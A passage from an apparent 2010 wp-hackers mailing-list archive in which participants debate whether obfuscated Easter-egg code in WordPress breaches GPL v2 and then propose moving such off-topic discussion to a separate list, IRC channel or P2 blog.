> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From jbloch at olympianetworks.com  Thu Jul  8 15:44:45 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Thu, 8 Jul 2010 11:44:45 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
Message-ID: <5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>

Discussion is great and all, but somewhere around 150 emails ago, it became way inappropriate for this list. I'm sorry for any unnecessary noise I've caused here and would appreciate it if the discussions could be moved off-list so that inboxes aren't flooded with irrelevant emails.

Thanks.
-John

On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:

> Agreed - this discussion got me out of lurking the list and actually
> contributing.  It's good to have great philosophical debate as long as
> all sides keep it civil, refrain from snide remarks, and can agree to
> disagree.
> 
> Mitch Canter
> http://www.mitchcanter.com
> http://www.studionashvegas.com
> 
> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>> I'd just like to say....
>> 
>> In spite of what everyone, including Matt, has said, I think this is the
>> best discussion we've had on here for ages.
>> 
>> Debates and points from both sides - with evidence and some big
>> conclusions.
>> 
>> Shame one side is wrong mind ... but still  ;)  (I jest).
>> 
>> G
>> 
>> 
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
>> Westwood
>> Sent: 07 July 2010 18:27
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>> 
>> 
>> On 7 Jul 2010, at 16:05, Mark E wrote:
>> 
>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
>> the
>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>>> do". And here I was thinking that you followed GPL to the letter, as
>> you imply other people should do.
>> 
>> 
>> In what way?
>> 
>> I believe the specific wording from the GPL2 you are interpreting is:
>> 
>> "The source code for a work means the preferred form of the work for
>> making modifications to it. For an executable work, complete source code
>> means all the source code for all modules it contains, plus any
>> associated interface definition files, plus the scripts used to control
>> compilation and installation of the executable. However, as a special
>> exception, the source code distributed need not include anything that is
>> normally distributed (in either source or binary form) with the major
>> components (compiler, kernel, and so on) of the operating system on
>> which the executable runs, unless that component itself accompanies the
>> executable. "
>> 
>> In my reading in no way does this preclude the distribution of
>> obfuscated code - what it is trying to prevent is the distribution of
>> compiled object files without the corresponding source code to allow
>> modifications to be made.
>> 
>> As JS and PHP are always distributed in source form as part of the
>> WordPress download I don't see how we are violating the licence.
>> 
>> Would you consider it a licence violation if we were to ship WordPress
>> without the include .dev.js files so as to decrease the download size
>> and make automatic upgrades use less memory?
>> 
>> Cheers
>> --
>> Peter Westwood
>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> 
> 
> 
> -- 
> Mitch Canter
> studionashvegas
> http://www.studionashvegas.com
> 615-512-2838
> 
> Find me on Twitter! http://www.studionashvegas.com
> 
> I only check email 2-3 times a day, but if you don't hear back in
> 24hr, let me know.  Thanks!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mitch at studionashvegas.com  Thu Jul  8 15:46:18 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Thu, 8 Jul 2010 10:46:18 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
	<5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>
Message-ID: <AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>

What about a mailing list specifically for discussions like this.

Unless there's a WP-discussions thread I don't know about, it might be
good and spark some good conversations.
Or we could use a WordPress blog with P2 *shrug*.

Mitch

On Thu, Jul 8, 2010 at 10:44 AM, John Bloch <jbloch at olympianetworks.com> wrote:
> Discussion is great and all, but somewhere around 150 emails ago, it became way inappropriate for this list. I'm sorry for any unnecessary noise I've caused here and would appreciate it if the discussions could be moved off-list so that inboxes aren't flooded with irrelevant emails.
>
> Thanks.
> -John
>
> On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:
>
>> Agreed - this discussion got me out of lurking the list and actually
>> contributing. ?It's good to have great philosophical debate as long as
>> all sides keep it civil, refrain from snide remarks, and can agree to
>> disagree.
>>
>> Mitch Canter
>> http://www.mitchcanter.com
>> http://www.studionashvegas.com
>>
>> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>>> I'd just like to say....
>>>
>>> In spite of what everyone, including Matt, has said, I think this is the
>>> best discussion we've had on here for ages.
>>>
>>> Debates and points from both sides - with evidence and some big
>>> conclusions.
>>>
>>> Shame one side is wrong mind ... but still ?;) ?(I jest).
>>>
>>> G
>>>
>>>
>>> -----Original Message-----
>>> From: wp-hackers-bounces at lists.automattic.com
>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
>>> Westwood
>>> Sent: 07 July 2010 18:27
>>> To: wp-hackers at lists.automattic.com
>>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>>>
>>>
>>> On 7 Jul 2010, at 16:05, Mark E wrote:
>>>
>>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
>>> the
>>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>>>> do". And here I was thinking that you followed GPL to the letter, as
>>> you imply other people should do.
>>>
>>>
>>> In what way?
>>>
>>> I believe the specific wording from the GPL2 you are interpreting is:
>>>
>>> "The source code for a work means the preferred form of the work for
>>> making modifications to it. For an executable work, complete source code
>>> means all the source code for all modules it contains, plus any
>>> associated interface definition files, plus the scripts used to control
>>> compilation and installation of the executable. However, as a special
>>> exception, the source code distributed need not include anything that is
>>> normally distributed (in either source or binary form) with the major
>>> components (compiler, kernel, and so on) of the operating system on
>>> which the executable runs, unless that component itself accompanies the
>>> executable. "
>>>
>>> In my reading in no way does this preclude the distribution of
>>> obfuscated code - what it is trying to prevent is the distribution of
>>> compiled object files without the corresponding source code to allow
>>> modifications to be made.
>>>
>>> As JS and PHP are always distributed in source form as part of the
>>> WordPress download I don't see how we are violating the licence.
>>>
>>> Would you consider it a licence violation if we were to ship WordPress
>>> without the include .dev.js files so as to decrease the download size
>>> and make automatic upgrades use less memory?
>>>
>>> Cheers
>>> --
>>> Peter Westwood
>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> Mitch Canter
>> studionashvegas
>> http://www.studionashvegas.com
>> 615-512-2838
>>
>> Find me on Twitter! http://www.studionashvegas.com
>>
>> I only check email 2-3 times a day, but if you don't hear back in
>> 24hr, let me know. ?Thanks!
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From jbloch at olympianetworks.com  Thu Jul  8 15:51:15 2010
From: jbloch at olympianetworks.com (John Bloch)
Date: Thu, 8 Jul 2010 11:51:15 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
	<5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>
	<AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>
Message-ID: <FE5BAEAD-1FDE-4E5F-9403-3EC327A1F059@olympianetworks.com>

Personally, I'd love some more social-oriented venues. Maybe an IRC channel where hlin won't warn us to stay on topic? #wordpress-social or something? #wordpress-after-hours? or a WP-Discussions email list? I like the having these conversations, but I would like them to be separate from the hackers list.

On Jul 8, 2010, at 11:46 AM, Mitch Canter wrote:

> What about a mailing list specifically for discussions like this.
> 
> Unless there's a WP-discussions thread I don't know about, it might be
> good and spark some good conversations.
> Or we could use a WordPress blog with P2 *shrug*.
> 
> Mitch
> 
> On Thu, Jul 8, 2010 at 10:44 AM, John Bloch <jbloch at olympianetworks.com> wrote:
>> Discussion is great and all, but somewhere around 150 emails ago, it became way inappropriate for this list. I'm sorry for any unnecessary noise I've caused here and would appreciate it if the discussions could be moved off-list so that inboxes aren't flooded with irrelevant emails.
>> 
>> Thanks.
>> -John
>> 
>> On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:
>> 
>>> Agreed - this discussion got me out of lurking the list and actually
>>> contributing.  It's good to have great philosophical debate as long as
>>> all sides keep it civil, refrain from snide remarks, and can agree to
>>> disagree.
>>> 
>>> Mitch Canter
>>> http://www.mitchcanter.com
>>> http://www.studionashvegas.com
>>> 
>>> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>>>> I'd just like to say....
>>>> 
>>>> In spite of what everyone, including Matt, has said, I think this is the
>>>> best discussion we've had on here for ages.
>>>> 
>>>> Debates and points from both sides - with evidence and some big
>>>> conclusions.
>>>> 
>>>> Shame one side is wrong mind ... but still  ;)  (I jest).
>>>> 
>>>> G
>>>> 
>>>> 
>>>> -----Original Message-----
>>>> From: wp-hackers-bounces at lists.automattic.com
>>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
>>>> Westwood
>>>> Sent: 07 July 2010 18:27
>>>> To: wp-hackers at lists.automattic.com
>>>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>>>> 
>>>> 
>>>> On 7 Jul 2010, at 16:05, Mark E wrote:
>>>> 
>>>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
>>>> the
>>>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>>>>> do". And here I was thinking that you followed GPL to the letter, as
>>>> you imply other people should do.
>>>> 
>>>> 
>>>> In what way?
>>>> 
>>>> I believe the specific wording from the GPL2 you are interpreting is:
>>>> 
>>>> "The source code for a work means the preferred form of the work for
>>>> making modifications to it. For an executable work, complete source code
>>>> means all the source code for all modules it contains, plus any
>>>> associated interface definition files, plus the scripts used to control
>>>> compilation and installation of the executable. However, as a special
>>>> exception, the source code distributed need not include anything that is
>>>> normally distributed (in either source or binary form) with the major
>>>> components (compiler, kernel, and so on) of the operating system on
>>>> which the executable runs, unless that component itself accompanies the
>>>> executable. "
>>>> 
>>>> In my reading in no way does this preclude the distribution of
>>>> obfuscated code - what it is trying to prevent is the distribution of
>>>> compiled object files without the corresponding source code to allow
>>>> modifications to be made.
>>>> 
>>>> As JS and PHP are always distributed in source form as part of the
>>>> WordPress download I don't see how we are violating the licence.
>>>> 
>>>> Would you consider it a licence violation if we were to ship WordPress
>>>> without the include .dev.js files so as to decrease the download size
>>>> and make automatic upgrades use less memory?
>>>> 
>>>> Cheers
>>>> --
>>>> Peter Westwood
>>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> 
>>> 
>>> 
>>> --
>>> Mitch Canter
>>> studionashvegas
>>> http://www.studionashvegas.com
>>> 615-512-2838
>>> 
>>> Find me on Twitter! http://www.studionashvegas.com
>>> 
>>> I only check email 2-3 times a day, but if you don't hear back in
>>> 24hr, let me know.  Thanks!
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> 
> 
> 
> -- 
> Mitch Canter
> studionashvegas
> http://www.studionashvegas.com
> 615-512-2838
> 
> Find me on Twitter! http://www.studionashvegas.com
> 
> I only check email 2-3 times a day, but if you don't hear back in
> 24hr, let me know.  Thanks!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From mitch at studionashvegas.com  Thu Jul  8 15:56:23 2010
From: mitch at studionashvegas.com (Mitch Canter)
Date: Thu, 8 Jul 2010 10:56:23 -0500
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <FE5BAEAD-1FDE-4E5F-9403-3EC327A1F059@olympianetworks.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
	<5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>
	<AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>
	<FE5BAEAD-1FDE-4E5F-9403-3EC327A1F059@olympianetworks.com>
Message-ID: <AANLkTinE1QEWRJQ-qkj34jlkZSLvryHMJ3wIBgGG6hl1@mail.gmail.com>

Having a WordPress Social IRC room would be fantastic.  A place where
people who LIKE WordPress could talk about it, but also talk other
stuff.  Have some sort of moderation, but not super strict - basically
like a WordPress themed bar.

Mitch

On Thu, Jul 8, 2010 at 10:51 AM, John Bloch <jbloch at olympianetworks.com> wrote:
> Personally, I'd love some more social-oriented venues. Maybe an IRC channel where hlin won't warn us to stay on topic? #wordpress-social or something? #wordpress-after-hours? or a WP-Discussions email list? I like the having these conversations, but I would like them to be separate from the hackers list.
>
> On Jul 8, 2010, at 11:46 AM, Mitch Canter wrote:
>
>> What about a mailing list specifically for discussions like this.
>>
>> Unless there's a WP-discussions thread I don't know about, it might be
>> good and spark some good conversations.
>> Or we could use a WordPress blog with P2 *shrug*.
>>
>> Mitch
>>
>> On Thu, Jul 8, 2010 at 10:44 AM, John Bloch <jbloch at olympianetworks.com> wrote:
>>> Discussion is great and all, but somewhere around 150 emails ago, it became way inappropriate for this list. I'm sorry for any unnecessary noise I've caused here and would appreciate it if the discussions could be moved off-list so that inboxes aren't flooded with irrelevant emails.
>>>
>>> Thanks.
>>> -John
>>>
>>> On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:
>>>
>>>> Agreed - this discussion got me out of lurking the list and actually
>>>> contributing. ?It's good to have great philosophical debate as long as
>>>> all sides keep it civil, refrain from snide remarks, and can agree to
>>>> disagree.
>>>>
>>>> Mitch Canter
>>>> http://www.mitchcanter.com
>>>> http://www.studionashvegas.com
>>>>
>>>> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com> wrote:
>>>>> I'd just like to say....
>>>>>
>>>>> In spite of what everyone, including Matt, has said, I think this is the
>>>>> best discussion we've had on here for ages.
>>>>>
>>>>> Debates and points from both sides - with evidence and some big
>>>>> conclusions.
>>>>>
>>>>> Shame one side is wrong mind ... but still ?;) ?(I jest).
>>>>>
>>>>> G
>>>>>
>>>>>
>>>>> -----Original Message-----
>>>>> From: wp-hackers-bounces at lists.automattic.com
>>>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
>>>>> Westwood
>>>>> Sent: 07 July 2010 18:27
>>>>> To: wp-hackers at lists.automattic.com
>>>>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
>>>>>
>>>>>
>>>>> On 7 Jul 2010, at 16:05, Mark E wrote:
>>>>>
>>>>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
>>>>> the
>>>>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
>>>>>> do". And here I was thinking that you followed GPL to the letter, as
>>>>> you imply other people should do.
>>>>>
>>>>>
>>>>> In what way?
>>>>>
>>>>> I believe the specific wording from the GPL2 you are interpreting is:
>>>>>
>>>>> "The source code for a work means the preferred form of the work for
>>>>> making modifications to it. For an executable work, complete source code
>>>>> means all the source code for all modules it contains, plus any
>>>>> associated interface definition files, plus the scripts used to control
>>>>> compilation and installation of the executable. However, as a special
>>>>> exception, the source code distributed need not include anything that is
>>>>> normally distributed (in either source or binary form) with the major
>>>>> components (compiler, kernel, and so on) of the operating system on
>>>>> which the executable runs, unless that component itself accompanies the
>>>>> executable. "
>>>>>
>>>>> In my reading in no way does this preclude the distribution of
>>>>> obfuscated code - what it is trying to prevent is the distribution of
>>>>> compiled object files without the corresponding source code to allow
>>>>> modifications to be made.
>>>>>
>>>>> As JS and PHP are always distributed in source form as part of the
>>>>> WordPress download I don't see how we are violating the licence.
>>>>>
>>>>> Would you consider it a licence violation if we were to ship WordPress
>>>>> without the include .dev.js files so as to decrease the download size
>>>>> and make automatic upgrades use less memory?
>>>>>
>>>>> Cheers
>>>>> --
>>>>> Peter Westwood
>>>>> http://blog.ftwr.co.uk | http://westi.wordpress.com
>>>>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
>>>>>
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>> _______________________________________________
>>>>> wp-hackers mailing list
>>>>> wp-hackers at lists.automattic.com
>>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>>
>>>>
>>>>
>>>>
>>>> --
>>>> Mitch Canter
>>>> studionashvegas
>>>> http://www.studionashvegas.com
>>>> 615-512-2838
>>>>
>>>> Find me on Twitter! http://www.studionashvegas.com
>>>>
>>>> I only check email 2-3 times a day, but if you don't hear back in
>>>> 24hr, let me know. ?Thanks!
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> Mitch Canter
>> studionashvegas
>> http://www.studionashvegas.com
>> 615-512-2838
>>
>> Find me on Twitter! http://www.studionashvegas.com
>>
>> I only check email 2-3 times a day, but if you don't hear back in
>> 24hr, let me know. ?Thanks!
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Mitch Canter
studionashvegas
http://www.studionashvegas.com
615-512-2838

Find me on Twitter! http://www.studionashvegas.com

I only check email 2-3 times a day, but if you don't hear back in
24hr, let me know.  Thanks!

From eric at eamann.com  Thu Jul  8 16:01:23 2010
From: eric at eamann.com (Eric Mann)
Date: Thu, 8 Jul 2010 09:01:23 -0700 (PDT)
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net>
	<0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk>
	<CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local>
	<AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com>
	<5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com>
	<AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com>
Message-ID: <1700065584.165220.1278604883642.JavaMail.open-xchange@oxusltgw12.schlund.de>

This is a great idea. ?I just set one up on my own site at
http://discussions.jumping-duck.com. ?Registration is open and all users will be
Authors by default (giving you the ability to create new threads and such).
?
I'll take some more time to refine it after work, but this is at least a place
to start.
?
... I forgot just how cool P2 is! :-)
?
~Eric
On July 8, 2010 at 3:46 PM Mitch Canter <mitch at studionashvegas.com> wrote:

> What about a mailing list specifically for discussions like this.
>
> Unless there's a WP-discussions thread I don't know about, it might be
> good and spark some good conversations.
> Or we could use a WordPress blog with P2 *shrug*.
>
> Mitch
>
> On Thu, Jul 8, 2010 at 10:44 AM, John Bloch <jbloch at olympianetworks.com>
> wrote:
> > Discussion is great and all, but somewhere around 150 emails ago, it became
> > way inappropriate for this list. I'm sorry for any unnecessary noise I've
> > caused here and would appreciate it if the discussions could be moved
> > off-list so that inboxes aren't flooded with irrelevant emails.
> >
> > Thanks.
> > -John
> >
> > On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:
> >
> >> Agreed - this discussion got me out of lurking the list and actually
> >> contributing. ?It's good to have great philosophical debate as long as
> >> all sides keep it civil, refrain from snide remarks, and can agree to
> >> disagree.
> >>
> >> Mitch Canter
> >> http://www.mitchcanter.com
> >> http://www.studionashvegas.com
> >>
> >> On Thu, Jul 8, 2010 at 3:26 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>
> >> wrote:
> >>> I'd just like to say....
> >>>
> >>> In spite of what everyone, including Matt, has said, I think this is the
> >>> best discussion we've had on here for ages.
> >>>
> >>> Debates and points from both sides - with evidence and some big
> >>> conclusions.
> >>>
> >>> Shame one side is wrong mind ... but still ?;) ?(I jest).
> >>>
> >>> G
> >>>
> >>>
> >>> -----Original Message-----
> >>> From: wp-hackers-bounces at lists.automattic.com
> >>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter
> >>> Westwood
> >>> Sent: 07 July 2010 18:27
> >>> To: wp-hackers at lists.automattic.com
> >>> Subject: Re: [wp-hackers] Fwd: Re: Putting the P in WordPress
> >>>
> >>>
> >>> On 7 Jul 2010, at 16:05, Mark E wrote:
> >>>
> >>>> The obfuscation of the easter egg blatantly violates GPL v2. So all
> >>> the
> >>>> stuff you say about GPL boils down to this: "Do as I as say, not as I
> >>>> do". And here I was thinking that you followed GPL to the letter, as
> >>> you imply other people should do.
> >>>
> >>>
> >>> In what way?
> >>>
> >>> I believe the specific wording from the GPL2 you are interpreting is:
> >>>
> >>> "The source code for a work means the preferred form of the work for
> >>> making modifications to it. For an executable work, complete source code
> >>> means all the source code for all modules it contains, plus any
> >>> associated interface definition files, plus the scripts used to control
> >>> compilation and installation of the executable. However, as a special
> >>> exception, the source code distributed need not include anything that is
> >>> normally distributed (in either source or binary form) with the major
> >>> components (compiler, kernel, and so on) of the operating system on
> >>> which the executable runs, unless that component itself accompanies the
> >>> executable. "
> >>>
> >>> In my reading in no way does this preclude the distribution of
> >>> obfuscated code - what it is trying to prevent is the distribution of
> >>> compiled object files without the corresponding source code to allow
> >>> modifications to be made.
> >>>
> >>> As JS and PHP are always distributed in source form as part of the
> >>> WordPress download I don't see how we are violating the licence.
> >>>
> >>> Would you consider it a licence violation if we were to ship WordPress
> >>> without the include .dev.js files so as to decrease the download size
> >>> and make automatic upgrades use less memory?
> >>>
> >>> Cheers
> >>> --
> >>> Peter Westwood
> >>> http://blog.ftwr.co.uk | http://westi.wordpress.com
> >>> C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5
> >>>
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>> _______________________________________________
> >>> wp-hackers mailing list
> >>> wp-hackers at lists.automattic.com
> >>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>
> >>
> >>
> >>
> >> --
> >> Mitch Canter
> >> studionashvegas
> >> http://www.studionashvegas.com
> >> 615-512-2838
> >>
> >> Find me on Twitter! http://www.studionashvegas.com
> >>
> >> I only check email 2-3 times a day, but if you don't hear back in
> >> 24hr, let me know. ?Thanks!
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> Mitch Canter
> studionashvegas
> http://www.studionashvegas.com
> 615-512-2838
>
> Find me on Twitter! http://www.studionashvegas.com
>
> I only check email 2-3 times a day, but if you don't hear back in
> 24hr, let me know.? Thanks!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From Gavin.Pearce at 3seven9.com  Thu Jul  8 16:01:04 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Thu, 8 Jul 2010 17:01:04 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <AANLkTinE1QEWRJQ-qkj34jlkZSLvryHMJ3wIBgGG6hl1@mail.gmail.com>
References: <4C3497BA.2090704@simplercomputing.net><0058DE9C-6A51-4D7B-9354-96CAF9633922@ftwr.co.uk><CD47955B7E065D48AB5CF226C2ED75C02E2FE4@tbs-sbs01.TBS.local><AANLkTilOs0duoWltmChDd8L-3XX56wlrqDC9lf0ir1FE@mail.gmail.com><5A59F83A-5023-480F-874C-87C195606056@olympianetworks.com><AANLkTimymF8kPPf-d6NLsDQVbe20DCvxaBAnN0dqdwLj@mail.gmail.com><FE5BAEAD-1FDE-4E5F-9403-3EC327A1F059@olympianetworks.com>
	<AANLkTinE1QEWRJQ-qkj34jlkZSLvryHMJ3wIBgGG6hl1@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E2FF4@tbs-sbs01.TBS.local>

Not so sure on a WordpreSs social list (for this kind of topic), but WP-Discussions sounds a good idea.

A lot of this conversation hasn't been social - it's been political anger at the way things have been run.

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mitch Canter
Sent: 08 July 2010 16:56
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Putting the P in WordPress

Having a WordPress Social IRC room would be fantastic.  A place where
people who LIKE WordPress could talk about it, but also talk other
stuff.  Have some sort of moderation, but not super strict - basically
like a WordPress themed bar.

Mitch

On Thu, Jul 8, 2010 at 10:51 AM, John Bloch <jbloch at olympianetworks.com> wrote:
> Personally, I'd love some more social-oriented venues. Maybe an IRC channel where hlin won't warn us to stay on topic? #wordpress-social or something? #wordpress-after-hours? or a WP-Discussions email list? I like the having these conversations, but I would like them to be separate from the hackers list.
>
> On Jul 8, 2010, at 11:46 AM, Mitch Canter wrote:
>
>> What about a mailing list specifically for discussions like this.
>>
>> Unless there's a WP-discussions thread I don't know about, it might be
>> good and spark some good conversations.
>> Or we could use a WordPress blog with P2 *shrug*.
>>
>> Mitch
>>
>> On Thu, Jul 8, 2010 at 10:44 AM, John Bloch <jbloch at olympianetworks.com> wrote:
>>> Discussion is great and all, but somewhere around 150 emails ago, it became way inappropriate for this list. I'm sorry for any unnecessary noise I've caused here and would appreciate it if the discussions could be moved off-list so that inboxes aren't flooded with irrelevant emails.
>>>
>>> Thanks.
>>> -John
>>>
>>> On Jul 8, 2010, at 11:35 AM, Mitch Canter wrote:
>>>
>>>> Agreed - this discussion got me out of lurking the list and actually
